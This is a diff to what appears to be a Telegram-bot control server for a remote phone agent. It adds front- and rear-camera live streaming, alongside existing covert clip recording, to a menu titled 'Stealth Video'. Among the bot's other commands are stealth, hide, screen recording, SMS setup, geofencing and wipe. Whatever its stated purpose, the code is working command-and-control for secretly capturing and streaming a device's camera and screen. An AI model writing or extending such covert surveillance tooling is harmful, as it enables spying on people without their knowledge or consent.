@@ -817,16 +817,20 @@ const SUBMENUS = {
     }
   },
   'menu:video': {
-    text: '🎥 <b>Stealth Video Recording</b>\nChoose duration and camera to record covertly:',
+    text: '🎥 <b>Stealth Video & Live Stream</b>\nRecord short clips or stream live camera video directly to Telegram:',
     keyboard: {
       inline_keyboard: [
         [
-          { text: '🤳 Front (15s)', callback_data: 'cmd:video:front:15' },
-          { text: '🤳 Front (30s)', callback_data: 'cmd:video:front:30' }
+          { text: '🔴 Live Stream (Front)', callback_data: 'cmd:livestream:front:5' },
+          { text: '🔴 Live Stream (Rear)', callback_data: 'cmd:livestream:back:5' }
         ],
         [
-          { text: '📷 Rear (15s)', callback_data: 'cmd:video:back:15' },
-          { text: '📷 Rear (30s)', callback_data: 'cmd:video:back:30' }
+          { text: '🤳 Front Clip (15s)', callback_data: 'cmd:video:front:15' },
+          { text: '📷 Rear Clip (15s)', callback_data: 'cmd:video:back:15' }
+        ],
+        [
+          { text: '🤳 Front Clip (30s)', callback_data: 'cmd:video:front:30' },
+          { text: '📷 Rear Clip (30s)', callback_data: 'cmd:video:back:30' }
         ],
         [
           { text: '🔙 Back to Dashboard', callback_data: 'menu:main' }
@@ -2112,7 +2116,8 @@ async function handleTelegramUpdate(token, update) {
     'smssetup', 'geofence', 'screenshot', 'screen_burst',
     'screenrecord', 'burst', 'screen', 'selftest', 'health', 'diagnostics',
     'lock_message', 'lock_pin', 'set_os_pin', 'reset_pin', 'app_uninstall', 'wipe_confirm', 'track_stop',
-    'ring_stop', 'shred', 'trap', 'duress_pin', 'stealth', 'hide', 'show'
+    'ring_stop', 'shred', 'trap', 'duress_pin', 'stealth', 'hide', 'show',
+    'livestream', 'stopstream', 'stream'
   ];
   if (directCmds.includes(command)) {
     await dispatchCommandToDevice(token, chatId, '/' + command, args);
@@ -2634,7 +2639,14 @@ app.post('/api/device/response', verifyDeviceProofOrBearer, upload.fields([
       formData.append('video', blob, 'video.mp4');
       formData.append('caption', message || '🎥 Captured video');
 
-      const videoActionKeyboard = {
+      const isLiveStream = message && (message.includes('LIVE [Seg') || message.includes('🔴 LIVE'));
+      const videoActionKeyboard = isLiveStream ? {
+        inline_keyboard: [
+          [
+            { text: '⏹️ Stop Live Stream', callback_data: 'cmd:stopstream' }
+          ]
+        ]
+      } : {
         inline_keyboard: [
           [
             { text: '🎥 Record Again', callback_data: 'cmd:video:front:15' },
